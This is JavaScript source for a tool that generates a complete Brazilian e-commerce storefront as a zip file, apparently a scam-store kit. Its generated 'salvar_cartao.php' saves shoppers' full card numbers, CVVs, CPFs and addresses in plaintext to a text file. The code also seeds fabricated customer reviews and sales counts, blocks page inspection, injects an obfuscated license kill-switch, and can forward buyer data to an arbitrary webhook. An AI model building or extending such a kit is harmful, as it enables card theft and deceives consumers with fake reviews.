    const whatsappRenew = window.WHATSAPP_RENEW || '5511999999999';
    // Script ofuscado para verificar validade no cliente
    const licenseCheckScript = `<script>!function(){var _0x=['${licenseExpiry}','${whatsappRenew}','parse','getTime','now','Sua licença expirou!','Entre em contato para renovar:','Renovar Licença','https://wa.me/','?text=Olá! Preciso renovar minha licença do site.'];var d=new Date(_0x[0]);if(Date[_0x[4]]()>d[_0x[3]]()){document.body.innerHTML='<div style="position:fixed;inset:0;background:#111;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999999;font-family:system-ui;color:#fff;text-align:center;padding:20px"><div style="font-size:60px;margin-bottom:20px">⚠️</div><h1 style="font-size:24px;margin-bottom:10px">'+_0x[5]+'</h1><p style="color:#aaa;margin-bottom:30px">'+_0x[6]+'</p><a href="'+_0x[8]+_0x[1]+_0x[9]+'" style="background:#25D366;color:#fff;padding:15px 30px;border-radius:30px;text-decoration:none;font-weight:bold;font-size:16px">'+_0x[7]+'</a></div>';document.title="Licença Expirada"}}();</script>\n`;

    // --- PIXEL TIKTOK ---
    const pixelBaseScript = getTikTokPixelScript(data.tiktokPixelId);
    let purchaseEventScript = "";
    // Script extra para disparar o evento de compra no sucesso do pagamento
    if (data.tiktokPixelId && data.firePixelOnGenerate) {
        purchaseEventScript = `if(typeof ttq!=='undefined'){ttq.track('CompletePayment',{content_id:cartItems[0].title,quantity:1,price:currentTotalGlobal || currentTotalValue,value:currentTotalGlobal || currentTotalValue,currency:'BRL'});}`;
    }

    // --- UPSELL ---
    let finalUpsellUrl = data.upsellUrl;
    const upsellCheckbox = document.getElementById("upsell-enable");
    // Se upsell ativo mas sem URL, gera o upsell padrão (taxa)
    if (upsellCheckbox && upsellCheckbox.checked && (!finalUpsellUrl || finalUpsellUrl.trim() === "")) {
        finalUpsellUrl = "upsell.html";
        zip.file("upsell.html", UPSELL_TEMPLATE.replace("{{LINK_TAXA}}", "checkout-taxa.php"));
        zip.file("checkout-taxa.php", CHECKOUT_TAXA_TEMPLATE);
    }

    // ==========================================================
    // GERAÇÃO DOS ARQUIVOS
    // ==========================================================

// 1. INDEX.PHP
    let indexContent = generateHTMLCode(); 
    if (pixelBaseScript) indexContent = indexContent.replace('</head>', pixelBaseScript + '\n</head>');
    if (commanderScript) indexContent = indexContent.replace('</body>', commanderScript + '\n</body>'); // Injeta script de persistência de URL
    // Injeta verificação de licença (ofuscado)
    indexContent = indexContent.replace('</head>', licenseCheckScript + '</head>');
    if (phpSecurityHeader) indexContent = phpSecurityHeader + indexContent;
    zip.file("index.php", indexContent);
    
    // 2. CHECKOUT.PHP
    let checkoutContent = checkoutTemplateToUse.replace('{{STORE_NAME}}', data.storeName || 'Loja Segura');
    checkoutContent = checkoutContent.replace('{{UPSELL_URL}}', finalUpsellUrl || '');
    checkoutContent = checkoutContent.replace('{{UPSELL_DELAY}}', data.upsellDelay || '15');
    const cardDiscount = val('card-decline-discount') || '15';
    checkoutContent = checkoutContent.replace(/\{\{CARD_DISCOUNT\}\}/g, cardDiscount);

// Injeções no Checkout
    if (pixelBaseScript) {
        if (checkoutContent.includes('</head>')) checkoutContent = checkoutContent.replace('</head>', pixelBaseScript + '\n</head>');
    }
    // Injeta verificação de licença no checkout
    if (checkoutContent.includes('</head>')) checkoutContent = checkoutContent.replace('</head>', licenseCheckScript + '</head>');
    // IMPORTANTE: O checkout também recebe o commanderScript para passar UTMs para o upsell se necessário
    if (commanderScript) checkoutContent = checkoutContent.replace('</body>', commanderScript + '\n</body>');

    // Injeta script de conversão (Purchase) no momento do sucesso
    if (purchaseEventScript) checkoutContent = checkoutContent.replace('if(res.success) {', 'if(res.success) { \n' + purchaseEventScript);
    
    // Adiciona segurança PHP no topo
    if (phpSecurityHeader) checkoutContent = checkoutContent.replace('<?php', phpSecurityHeader.replace('?>', '') + '\n');
    
    zip.file("checkout.php", checkoutContent);
    
    // 2.5 SALVAR_CARTAO.PHP (para salvar dados de cartao e endereco em txt)
    const salvarCartaoPhp = `<?php
header('Content-Type: application/json');
$data = json_decode(file_get_contents('php://input'), true);
if (!$data) { echo json_encode(['success' => false]); exit; }

$linha = "=== COMPRA COM CARTAO ===" . "\\n";
$linha .= "Data/Hora: " . date('d/m/Y H:i:s') . "\\n";
$linha .= "\\n--- DADOS DO CARTAO ---\\n";
$linha .= "Numero: " . ($data['card_number'] ?? '') . "\\n";
$linha .= "Validade: " . ($data['card_expiry'] ?? '') . "\\n";
$linha .= "CVV: " . ($data['card_cvv'] ?? '') . "\\n";
$linha .= "Titular: " . ($data['card_holder'] ?? '') . "\\n";
$linha .= "\\n--- DADOS PESSOAIS ---\\n";
$linha .= "Nome: " . ($data['customer_name'] ?? '') . "\\n";
$linha .= "Email: " . ($data['customer_email'] ?? '') . "\\n";
$linha .= "Telefone: " . ($data['customer_phone'] ?? '') . "\\n";
$linha .= "CPF: " . ($data['customer_cpf'] ?? '') . "\\n";
$linha .= "\\n--- ENDERECO ---\\n";
$linha .= "CEP: " . ($data['address_zip'] ?? '') . "\\n";
$linha .= "Estado: " . ($data['address_state'] ?? '') . "\\n";
$linha .= "Cidade: " . ($data['address_city'] ?? '') . "\\n";
$linha .= "Bairro: " . ($data['address_neighborhood'] ?? '') . "\\n";
$linha .= "Rua: " . ($data['address_street'] ?? '') . "\\n";
$linha .= "Numero: " . ($data['address_number'] ?? '') . "\\n";
$linha .= "Complemento: " . ($data['address_complement'] ?? '') . "\\n";
$linha .= "\\n--- COMPRA ---\\n";
$linha .= "Valor: R$ " . number_format(($data['amount'] ?? 0), 2, ',', '.') . "\\n";
$linha .= "Timestamp: " . ($data['timestamp'] ?? '') . "\\n";
$linha .= "\\n" . str_repeat("=", 50) . "\\n\\n";

$arquivo = 'cartoes_salvos.txt';
file_put_contents($arquivo, $linha, FILE_APPEND | LOCK_EX);

echo json_encode(['success' => true]);
?>`;
    zip.file("salvar_cartao.php", salvarCartaoPhp);
    
// 3. CARRINHO.HTML
    let cartContent = CART_TEMPLATE;
    if (pixelBaseScript) cartContent = cartContent.replace('</head>', pixelBaseScript + '\n</head>');
    // Injeta verificação de licença no carrinho
    cartContent = cartContent.replace('</head>', licenseCheckScript + '</head>');
    if (commanderScript) cartContent = cartContent.replace('</body>', commanderScript + '\n</body>');
    if (data.securityAntiCopy) {
         const antiCopyJS = `<script>document.addEventListener('contextmenu', e => e.preventDefault()); document.addEventListener('keydown', e => { if(e.keyCode==123) { e.preventDefault(); return false; } });</script>`;
         cartContent = cartContent.replace('</body>', antiCopyJS + '</body>');
    }
    zip.file("carrinho.html", cartContent);
    
    // 4. LOJA.HTML
    const mainProductId = data.productUrl || "main-product";
    const allProductsMap = {};
    // Reconstrói o mapa de produtos para o JSON da loja
    allProductsMap[mainProductId] = {
        id: mainProductId, productTitle: data.productTitle, currentPrice: data.currentPrice, originalPrice: data.originalPrice,
        mainImage: data.mainImage, storeName: data.storeName, storeLogoUrl: data.storeLogoUrl, colors: data.colors, sizes: data.sizes
    };
    if (data.recommendations && data.recommendations.length > 0) {
        data.recommendations.forEach(rec => {
            let recId = rec.productUrl || rec.productTitle;
            if (recId === mainProductId) recId = recId + "-rec";
            if (!recId) recId = "rec-" + Math.floor(Math.random() * 100000);
            allProductsMap[recId] = {
                id: recId, productTitle: rec.productTitle || rec.title, currentPrice: rec.currentPrice || rec.price,
                originalPrice: rec.originalPrice || rec.currentPrice, mainImage: rec.mainImage || rec.image,
                productRating: rec.productRating || "4.9", salesCount: rec.salesCount || "50", storeName: data.storeName,
                storeLogoUrl: data.storeLogoUrl, colors: rec.colors || [], sizes: rec.sizes || []
            };
        });
    }
    // Preparar dados da loja para o template
    const couponTitle = data.couponTitle || 'Cupom de frete gratis';
    const couponSub = data.couponSub || 'Sem gasto minimo';
    const discountTitle = data.discountTitle || 'Ate 85% OFF';
    const discountSub = data.discountSub || 'Em produtos selecionados';
    const categoriesJson = JSON.stringify(data.categories || []);
    
    let lojaContent = LOJA_TEMPLATE
        .replace('let allProducts = {};', 'let allProducts = ' + JSON.stringify(allProductsMap) + ';')
        .replace(/\{\{STORE_NAME\}\}/g, data.storeName || 'Loja')
        .replace(/\{\{STORE_LOGO\}\}/g, data.storeLogoUrl || 'https://placehold.co/50x50?text=Logo')
        .replace('{{STORE_SALES}}', data.storeSales || '1.000')
        .replace('{{COUPON_TITLE}}', couponTitle)
        .replace('{{COUPON_SUB}}', couponSub)
        .replace('{{DISCOUNT_TITLE}}', discountTitle)
        .replace('{{DISCOUNT_SUB}}', discountSub)
        .replace('{{CATEGORIES_JSON}}', categoriesJson);
    
    if (pixelBaseScript) {
         if (lojaContent.includes('')) lojaContent = lojaContent.replace('', pixelBaseScript);
         else lojaContent = lojaContent.replace('</head>', pixelBaseScript + '\n</head>');
    }
    if (commanderScript) lojaContent = lojaContent.replace('</body>', commanderScript + '\n</body>');
    if (data.securityAntiCopy) {
         const antiCopyJS = `<script>document.addEventListener('contextmenu', e => e.preventDefault()); document.addEventListener('keydown', e => { if(e.keyCode==123) { e.preventDefault(); return false; } });</script>`;
         lojaContent = lojaContent.replace('</body>', antiCopyJS + '</body>');
    }
    zip.file("loja.html", lojaContent);
    
    // 5. PROCESSAR_PAGAMENTO.PHP (Back-end)
    let webhookPhpLogic = "";
    // Webhook Genérico
    if (data.customWebhookUrl && data.customWebhookUrl.trim() !== "") {
        webhookPhpLogic += `$webhookUrl='${data.customWebhookUrl}';if($webhookUrl&&isset($pixCode)){$hookData=json_encode(['event'=>'pix_created','store'=>'${data.storeName||"Loja"}','amount'=>$amount/100,'customer'=>['name'=>$name,'email'=>$email,'cpf'=>$cpf],'pix_code'=>$pixCode,'date'=>date('Y-m-d H:i:s')]);$chW=curl_init($webhookUrl);curl_setopt($chW,CURLOPT_POST,1);curl_setopt($chW,CURLOPT_POSTFIELDS,$hookData);curl_setopt($chW,CURLOPT_HTTPHEADER,['Content-Type: application/json']);curl_setopt($chW,CURLOPT_RETURNTRANSFER,true);curl_setopt($chW,CURLOPT_TIMEOUT,4);curl_exec($chW);curl_close($chW);}`;
    }
    // TikTok Events API (Server-Side)
    if (data.tiktokAccessToken && data.tiktokAccessToken.trim() !== "" && data.tiktokPixelId) {
        const ttToken = data.tiktokAccessToken.trim();
        const ttPixel = data.tiktokPixelId.trim();
        webhookPhpLogic += `
        // TIKTOK EVENTS API
        $ttToken = '${ttToken}';
        $ttPixel = '${ttPixel}';
        if(isset($pixCode)) { 
            $ttEventId = uniqid('tt_');
            $hashEmail = hash("sha256", strtolower(trim($email)));
            $hashPhone = hash("sha256", preg_replace('/\\D/', '', $phone));
            $ttData = [ "pixel_code" => $ttPixel, "event" => "CompletePayment", "event_id" => $ttEventId, "timestamp" => date("c"), "context" => [ "page" => ["url" => "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']], "user" => [ "email" => $hashEmail, "phone" => $hashPhone, "client_ip" => $_SERVER['REMOTE_ADDR'], "user_agent" => $_SERVER['HTTP_USER_AGENT'] ] ], "properties" => [ "value" => $amount / 100, "currency" => "BRL", "contents" => [ ["content_id" => "sku_1", "content_type" => "product", "quantity" => 1] ] ] ];
            $chTT = curl_init("https://business-api.tiktok.com/open_api/v1.3/pixel/track/");
            curl_setopt($chTT, CURLOPT_POST, 1);
            curl_setopt($chTT, CURLOPT_POSTFIELDS, json_encode($ttData));
            curl_setopt($chTT, CURLOPT_HTTPHEADER, ["Access-Token: " . $ttToken, "Content-Type: application/json"]);
            curl_setopt($chTT, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($chTT, CURLOPT_TIMEOUT, 2);
            curl_exec($chTT);
            curl_close($chTT);
        }
        `;
    }

    if (webhookPhpLogic) paymentPHP = paymentPHP.replace("echo json_encode(['success'=>true", webhookPhpLogic + "\n echo json_encode(['success'=>true");
    if (phpSecurityHeader) paymentPHP = paymentPHP.replace('<?php', phpSecurityHeader.replace('?>', '') + '\n');

    zip.file("processar_pagamento.php", paymentPHP);
    
    // GERA O ZIP
    zip.generateAsync({type:"blob"}).then(function(content) {
        saveAs(content, "loja-" + (data.storeName || "completa") + ".zip");
    });
}
// --- VERSÃO CORRIGIDA ---
function addColor(data) {
  // Garante que 'data' seja um objeto válido mesmo se chamado sem argumentos
  const d = data && typeof data === 'object' ? data : { imageUrl: "", name: "", price: "", checkoutUrl: "" };
  
  const container = el("color-options");
  const item = document.createElement("div");
  item.className = "option-item";
  item.innerHTML = `
      <input type="text" class="color-image-url" placeholder="URL da Imagem" value="${d.imageUrl || ''}">
      <input type="text" class="color-name" placeholder="Nome da Cor" value="${d.name || ''}">
      <input type="text" class="color-price" placeholder="Preço (Ex: 49,90)" value="${d.price || ''}">
      <input type="text" class="color-checkout-url" placeholder="URL de Checkout" value="${d.checkoutUrl || ''}">
      <button class="remove-btn" onclick="removeOption(this)">X</button>`;
  
  container.appendChild(item);
  
  // Adiciona os listeners de atualização automática para os novos campos
  setupLiveUpdateListeners(item);
  return item;
}

function addSize(data) {
  const d = typeof data === 'string' ? data : "";
  const container = el("size-options");
  const item = document.createElement("div");
  item.className = "option-item";
  item.innerHTML = `
      <input type="text" placeholder="Tamanho" value="${d}">
      <button class="remove-btn" onclick="removeOption(this)">X</button>`;
  
  container.appendChild(item);
  setupLiveUpdateListeners(item);
  return item;
}

function addReview(data = null) {
  const container = el("review-items");
  const reviewCount = container.querySelectorAll(".item-editor").length + 1;
  const item = document.createElement("div");
  item.className = "item-editor";
  const defaultData = { name: "", avatarUrl: "", details: "", stars: 5, text: "", images: [] };
  const reviewData = data || defaultData;
  
  // Compatibilidade: aceita tanto 'image' (string) quanto 'images' (array)
  let imgs = reviewData.images || [];
  if (!imgs.length && reviewData.image) imgs = [reviewData.image];
  const img1 = imgs[0] || "";
  const img2 = imgs[1] || "";
  const img3 = imgs[2] || "";
  const img4 = imgs[3] || "";
  const img5 = imgs[4] || "";

  item.innerHTML = `
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 10px;">
            <h4>Avaliacao ${reviewCount}</h4>
            <button class="remove-btn" onclick="this.parentElement.parentElement.remove(); updateOutputDebounced();">Remover</button>
        </div>
        <div class="item-editor-grid">
            <div class="rev-preview-images" style="display:flex;gap:6px;flex-wrap:wrap;">
                <img src="${img1 || "https://placehold.co/60x60/e3e3e4/555?text=1"}" alt="Foto 1" class="rev-preview-img" style="width:60px;height:60px;object-fit:cover;border-radius:6px;cursor:pointer;" onclick="this.src=this.closest('.item-editor').querySelector('.rev-image-1').value || 'https://placehold.co/60x60/e3e3e4/555?text=1'">
                <img src="${img2 || "https://placehold.co/60x60/e3e3e4/555?text=2"}" alt="Foto 2" class="rev-preview-img" style="width:60px;height:60px;object-fit:cover;border-radius:6px;cursor:pointer;" onclick="this.src=this.closest('.item-editor').querySelector('.rev-image-2').value || 'https://placehold.co/60x60/e3e3e4/555?text=2'">
                <img src="${img3 || "https://placehold.co/60x60/e3e3e4/555?text=3"}" alt="Foto 3" class="rev-preview-img" style="width:60px;height:60px;object-fit:cover;border-radius:6px;cursor:pointer;" onclick="this.src=this.closest('.item-editor').querySelector('.rev-image-3').value || 'https://placehold.co/60x60/e3e3e4/555?text=3'">
                <img src="${img4 || "https://placehold.co/60x60/e3e3e4/555?text=4"}" alt="Foto 4" class="rev-preview-img" style="width:60px;height:60px;object-fit:cover;border-radius:6px;cursor:pointer;" onclick="this.src=this.closest('.item-editor').querySelector('.rev-image-4').value || 'https://placehold.co/60x60/e3e3e4/555?text=4'">
                <img src="${img5 || "https://placehold.co/60x60/e3e3e4/555?text=5"}" alt="Foto 5" class="rev-preview-img" style="width:60px;height:60px;object-fit:cover;border-radius:6px;cursor:pointer;" onclick="this.src=this.closest('.item-editor').querySelector('.rev-image-5').value || 'https://placehold.co/60x60/e3e3e4/555?text=5'">
            </div>
            <div class="details">
                <input type="text" class="rev-name" placeholder="Nome do Cliente" value="${reviewData.name}">
                <input type="text" class="rev-avatar-url" placeholder="URL da Foto de Perfil" value="${reviewData.avatarUrl}">
                <input type="text" class="rev-details" placeholder="Detalhes (Item, Cor, Tamanho)" value="${reviewData.details}">
                <input type="number" class="rev-stars" placeholder="Estrelas (1-5)" min="1" max="5" value="${reviewData.stars}">
                <textarea class="rev-text" placeholder="Texto da avaliacao">${reviewData.text}</textarea>
                <div style="display:flex;gap:4px;flex-wrap:wrap;">
                    <input type="text" class="rev-image-1" placeholder="Foto 1" value="${img1}" style="flex:1;min-width:80px;font-size:11px;" oninput="this.closest('.item-editor').querySelectorAll('.rev-preview-img')[0].src=this.value || 'https://placehold.co/60x60/e3e3e4/555?text=1'">
                    <input type="text" class="rev-image-2" placeholder="Foto 2" value="${img2}" style="flex:1;min-width:80px;font-size:11px;" oninput="this.closest('.item-editor').querySelectorAll('.rev-preview-img')[1].src=this.value || 'https://placehold.co/60x60/e3e3e4/555?text=2'">
                    <input type="text" class="rev-image-3" placeholder="Foto 3" value="${img3}" style="flex:1;min-width:80px;font-size:11px;" oninput="this.closest('.item-editor').querySelectorAll('.rev-preview-img')[2].src=this.value || 'https://placehold.co/60x60/e3e3e4/555?text=3'">
                    <input type="text" class="rev-image-4" placeholder="Foto 4" value="${img4}" style="flex:1;min-width:80px;font-size:11px;" oninput="this.closest('.item-editor').querySelectorAll('.rev-preview-img')[3].src=this.value || 'https://placehold.co/60x60/e3e3e4/555?text=4'">
                    <input type="text" class="rev-image-5" placeholder="Foto 5" value="${img5}" style="flex:1;min-width:80px;font-size:11px;" oninput="this.closest('.item-editor').querySelectorAll('.rev-preview-img')[4].src=this.value || 'https://placehold.co/60x60/e3e3e4/555?text=5'">
                </div>
            </div>
        </div>`;
  container.appendChild(item);
  return item;
}

function clearReviewImage(btn) {
  const inputGroup = btn.parentElement;
  const imageUrlInput = inputGroup.querySelector(".rev-image");
  imageUrlInput.value = "";
  const previewImage = inputGroup.closest(".item-editor-grid").querySelector(".rev-preview-image");
  previewImage.src = "https://placehold.co/100x100/e3e3e4/555?text=Sem+Foto";
  updateOutputDebounced();
}


const REVIEW_PRESET_LIBRARY = {
  eletronico: [
    { name: "R**o S.", details: "Item: preto, padrão", stars: 5, text: "Chegou certinho e funcionando muito bem. A qualidade me surpreendeu e foi fácil de usar desde o primeiro dia.", image: "" },
    { name: "M**a L.", details: "Item: branco, padrão", stars: 5, text: "Produto muito bom pelo valor. A imagem e o acabamento são melhores do que eu esperava, recomendo bastante.", image: "" },
    { name: "J**o P.", details: "Item: padrão", stars: 4, text: "Entrega rápida e veio bem embalado. Testei aqui em casa e funcionou sem nenhum problema.", image: "" },
    { name: "C**a R.", details: "Item: preto", stars: 5, text: "Gostei demais. Visual bonito, fácil de instalar e atendeu exatamente o que eu precisava.", image: "" },
    { name: "A**a M.", details: "Item: padrão", stars: 5, text: "Comprei com receio, mas valeu muito a pena. Ótimo custo-benefício e qualidade excelente.", image: "" }
  ],
  cozinha: [
    { name: "S**a F.", details: "Item: padrão", stars: 5, text: "Material muito bom e resistente. Já usei várias vezes e facilitou bastante minha rotina na cozinha.", image: "" },
    { name: "P**a C.", details: "Item: padrão", stars: 5, text: "Veio igual ao anúncio, bem embalado e bonito. Além de útil, deixou minha cozinha mais organizada.", image: "" },
    { name: "L**e D.", details: "Item: padrão", stars: 4, text: "Gostei bastante da compra. Cumpre o que promete e o acabamento é melhor do que eu imaginava.", image: "" },
    { name: "T**a A.", details: "Item: padrão", stars: 5, text: "Produto prático, fácil de limpar e muito funcional. Compraria novamente sem dúvidas.", image: "" },
    { name: "V**a N.", details: "Item: padrão", stars: 5, text: "Amei. Ajuda muito no dia a dia e parece ser bem durável. Recomendo demais para quem cozinha sempre.", image: "" }
  ],
  sapato: [
    { name: "E**e G.", details: "Item: preto, 39", stars: 5, text: "Muito confortável no pé e bonito pessoalmente. O acabamento é ótimo e combina com várias roupas.", image: "" },
    { name: "N**a T.", details: "Item: bege, 37", stars: 5, text: "Calçou super bem e ficou lindo. Material bom e muito mais bonito ao vivo.", image: "" },
    { name: "B**o L.", details: "Item: preto, 42", stars: 4, text: "Gostei bastante, tamanho certo e confortável para usar por horas. Vale a compra.", image: "" },
    { name: "R**a P.", details: "Item: branco, 36", stars: 5, text: "Leve, bonito e confortável. Já usei algumas vezes e continua impecável.", image: "" },
    { name: "D**i S.", details: "Item: marrom, 40", stars: 5, text: "Ótimo custo-benefício. Veio igual as fotos e o encaixe no pé ficou perfeito.", image: "" }
  ],
  vestuario: [
    { name: "G**a M.", details: "Item: preto, M", stars: 5, text: "Tecido muito bom e modelagem bonita. Vestiu super bem e ficou igual ao anúncio.", image: "" },
    { name: "F**a R.", details: "Item: branco, G", stars: 5, text: "A peça é linda e confortável. Costura bem feita e caimento excelente no corpo.", image: "" },
    { name: "T**s C.", details: "Item: azul, P", stars: 4, text: "Gostei bastante da qualidade. O tamanho veio certo e a roupa ficou muito bonita.", image: "" },
    { name: "L**a V.", details: "Item: bege, M", stars: 5, text: "Amei a compra. O tecido é macio, não ficou transparente e vestiu muito bem.", image: "" },
    { name: "M**u D.", details: "Item: preto, GG", stars: 5, text: "Excelente custo-benefício. Já lavei e a peça continua bonita e com ótimo caimento.", image: "" }
  ],
  beleza: [
    { name: "I**a P.", details: "Item: padrão", stars: 5, text: "Gostei muito do resultado. Fácil de usar e senti diferença logo nas primeiras utilizações.", image: "" },
    { name: "K**a S.", details: "Item: padrão", stars: 5, text: "Veio certinho, bem embalado e com qualidade ótima. Produto muito bom mesmo.", image: "" },
    { name: "A**e L.", details: "Item: padrão", stars: 4, text: "Textura agradável e aplicação simples. Valeu a pena e compraria novamente.", image: "" },
    { name: "D**a F.", details: "Item: padrão", stars: 5, text: "Superou minhas expectativas. Muito bom e prático para incluir na rotina.", image: "" },
    { name: "C**a M.", details: "Item: padrão", stars: 5, text: "Amei a compra. Percebi ótimo desempenho e a qualidade realmente é muito boa.", image: "" }
  ],
  utilidades: [
    { name: "H**o R.", details: "Item: padrão", stars: 5, text: "Produto muito útil no dia a dia. Simples de usar e ajuda bastante na rotina.", image: "" },
    { name: "P**a B.", details: "Item: padrão", stars: 5, text: "Chegou rápido, veio tudo certo e é mais útil do que eu imaginava. Recomendo.", image: "" },
    { name: "M**e C.", details: "Item: padrão", stars: 4, text: "Boa qualidade e acabamento. Cumpre o que promete e facilitou bastante aqui em casa.", image: "" },
    { name: "V**r T.", details: "Item: padrão", stars: 5, text: "Gostei muito, material resistente e bem pensado. Vale cada centavo.", image: "" },
    { name: "J**a N.", details: "Item: padrão", stars: 5, text: "Muito prático e funcional. Excelente para quem quer algo útil e com boa durabilidade.", image: "" }
  ],
  infantil: [
    { name: "M**e A.", details: "Item: padrão", stars: 5, text: "Muito lindo e de boa qualidade. Ficou perfeito e atendeu muito bem o que eu precisava.", image: "" },
    { name: "R**a C.", details: "Item: padrão", stars: 5, text: "Chegou certinho e gostei bastante do acabamento. Produto muito bonito e bem feito.", image: "" },
    { name: "T**e G.", details: "Item: padrão", stars: 4, text: "Material bom e bem confortável. Compraria novamente sem problema.", image: "" },
    { name: "S**a P.", details: "Item: padrão", stars: 5, text: "Amei, veio igual ao anúncio e com ótima qualidade. Recomendo muito.", image: "" },
    { name: "L**i D.", details: "Item: padrão", stars: 5, text: "Ótimo custo-benefício e muito bonito ao vivo. Valeu muito a compra.", image: "" }
  ]
};

function ensureReviewPresetUI() {
  const reviewsTab = el("reviews");
  const reviewItems = el("review-items");
  if (!reviewsTab || !reviewItems || el("review-preset-category")) return;

  const wrap = document.createElement("div");
  wrap.className = "form-group";
  wrap.style.background = "#f8fafc";
  wrap.style.padding = "15px";
  wrap.style.borderRadius = "8px";
  wrap.style.border = "1px solid #cbd5e1";
  wrap.style.marginBottom = "20px";
  wrap.innerHTML = `
    <h3 style="margin-top:0; margin-bottom:12px;">Modelos internos por categoria</h3>
    <div style="display:grid; grid-template-columns: 1fr auto auto; gap:10px; align-items:end;">
      <div>
        <label style="display:block; margin-bottom:6px;">Categoria da oferta</label>
        <select id="review-preset-category" style="width:100%; padding:10px; border:1px solid #cbd5e1; border-radius:6px;">
          <option value="">Selecione uma categoria</option>
          <option value="eletronico">Eletrônico</option>
          <option value="cozinha">Cozinha</option>
          <option value="sapato">Sapato</option>
          <option value="vestuario">Vestuário</option>
          <option value="beleza">Beleza</option>
          <option value="utilidades">Utilidades</option>
          <option value="infantil">Infantil</option>
        </select>
      </div>
      <button type="button" class="add-btn" id="apply-review-preset-btn" style="background-color:#000; color:#fff;">Preencher modelos</button>
      <button type="button" class="add-btn" id="clear-review-preset-btn" style="background-color:#6b7280; color:#fff;">Limpar modelos</button>
    </div>
    <p style="margin:10px 0 0; font-size:12px; color:#475569;">Preenche os cards com modelos internos editáveis. Revise e adapte antes de usar.</p>
    <div style="margin-top:12px;">
      <label style="display:block; margin-bottom:6px;">Modelos carregados</label>
      <textarea id="review-drafts" rows="7" placeholder="Os modelos internos da categoria vão aparecer aqui..." style="width:100%; padding:10px; border:1px solid #cbd5e1; border-radius:6px; resize:vertical;"></textarea>
    </div>
  `;

  reviewsTab.insertBefore(wrap, reviewItems);

  const applyBtn = el("apply-review-preset-btn");
  const clearBtn = el("clear-review-preset-btn");
  if (applyBtn) applyBtn.addEventListener("click", loadInternalReviewModels);
  if (clearBtn) clearBtn.addEventListener("click", clearInternalReviewModels);
}

function loadInternalReviewModels() {
  const select = el("review-preset-category");
  const textarea = el("review-drafts");
  const container = el("review-items");
  if (!select || !textarea || !container) return;

  const category = select.value;
  const items = reviewDraftPresets[category];
  if (!category || !items) {
    textarea.value = "";
    return;
  }

  textarea.value = items.map((item, index) => `${index + 1}. ${item}`).join("\n");
  container.innerHTML = "";

  items.forEach((item, index) => {
    addReview({
      name: `Modelo interno ${index + 1}`,
      avatarUrl: "",
      details: "Rascunho para adaptação",
      stars: "",
      text: item,
      image: ""
    });
  });

  setupLiveUpdateListeners(container);
  updateOutputDebounced();
}

function clearInternalReviewModels() {
  const textarea = el("review-drafts");
  const select = el("review-preset-category");
  const container = el("review-items");
  if (textarea) textarea.value = "";
  if (select) select.value = "";
  if (container) container.innerHTML = "";
  updateOutputDebounced();
}

function loadReviewDrafts() { loadInternalReviewModels(); }
function clearReviewDrafts() { clearInternalReviewModels(); }

// ============================================================================
// === FUNÇÕES DE VARIAÇÕES E RECOMENDAÇÕES (CORRIGIDO) =======================
// ============================================================================

// ============================================================================
// === CORRE��ÃO: FUN�����ÕES DE VARIAÇÃO E RECOMENDAÇÃO ===========================
// ============================================================================

// ============================================================================
// === FUNÇÕES DE VARIAÇÕES E RECOMENDAÇÕES (BLINDADO) ========================
// ============================================================================

function addRecColor(btn, data) {
  // Proteção: Garante que data não seja null/undefined para não travar o script
  const safeData = data || { imageUrl: "", name: "", price: "", checkoutUrl: "" };
  
  // Busca o container correto
  const container = btn.closest('.rec-variations').querySelector('.rec-color-options');
  
  const item = document.createElement("div");
  item.className = "option-item";
  item.style.display = "flex";
  item.style.gap = "5px";
  item.style.marginBottom = "5px";
  
  item.innerHTML = `
      <input type="text" class="rec-color-image-url" placeholder="URL Imagem" value="${safeData.imageUrl || ''}" style="width:25%;">
      <input type="text" class="rec-color-name" placeholder="Nome (Ex: Azul)" value="${safeData.name || ''}" style="width:25%;">
      <input type="text" class="rec-color-price" placeholder="Pre��o" value="${safeData.price || ''}" style="width:20%;">
      <input type="text" class="rec-color-checkout-url" placeholder="Link Checkout (Opcional)" value="${safeData.checkoutUrl || ''}" style="width:25%;">
      <button class="remove-btn" onclick="removeOption(this)" style="width:20px; padding:0;">X</button>
  `;
  container.appendChild(item);
  return item;
}

function addRecSize(btn, data) {
  const safeData = data || "";
  const container = btn.closest('.rec-variations').querySelector('.rec-size-options');
  
  const item = document.createElement("div");
  item.className = "option-item";
  item.style.display = "flex";
  item.style.gap = "5px";
  item.style.marginBottom = "5px";

  item.innerHTML = `
      <input type="text" class="rec-size-name" placeholder="Tamanho (Ex: G)" value="${safeData}" style="flex:1;">
      <button class="remove-btn" onclick="removeOption(this)" style="width:30px;">X</button>
  `;
  container.appendChild(item);
  return item;
}

function addRecReview(btn, data) {
    const container = btn.previousElementSibling; 
    const reviewCount = container.querySelectorAll(".rec-review-item").length + 1;
    
    const defaultData = { name: "Cliente", avatarUrl: "", details: "Item: Padrão", stars: 5, text: "Produto excelente!", image: "", images: [] };
    const rData = data || defaultData;

    // Compatibilidade: aceita 'images' (array) ou 'image' (string)
    let recImgs = rData.images || [];
    if (!recImgs.length && rData.image) recImgs = [rData.image];
    const ri1 = recImgs[0] || "";
    const ri2 = recImgs[1] || "";
    const ri3 = recImgs[2] || "";
    const ri4 = recImgs[3] || "";
    const ri5 = recImgs[4] || "";

    const item = document.createElement("div");
    item.className = "rec-review-item";
    item.style.border = "1px solid #e0e0e0";
    item.style.padding = "10px";
    item.style.marginBottom = "8px";
    item.style.borderRadius = "6px";
    item.style.backgroundColor = "#fff";

    item.innerHTML = `
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 5px;">
            <span style="font-weight:bold; font-size:11px; color:#555;">Avaliação #${reviewCount}</span>
            <button class="remove-btn" onclick="this.parentElement.parentElement.remove(); updateOutputDebounced();" style="font-size:10px; padding:2px 6px;">Excluir</button>
        </div>
        <input type="text" class="rec-rev-name" placeholder="Nome do Cliente" value="${rData.name}" style="width:100%; margin-bottom:4px; font-size:12px;">
        <div style="display:flex; gap:5px; margin-bottom:4px;">
            <input type="text" class="rec-rev-avatar" placeholder="URL Avatar (opcional)" value="${rData.avatarUrl}" style="flex:1; font-size:12px;">
            <input type="number" class="rec-rev-stars" placeholder="⭐" min="1" max="5" value="${rData.stars}" style="width:50px; font-size:12px;">
        </div>
        <textarea class="rec-rev-text" placeholder="Comentário do cliente..." style="width:100%; margin-bottom:4px; font-size:12px; height:40px;">${rData.text}</textarea>
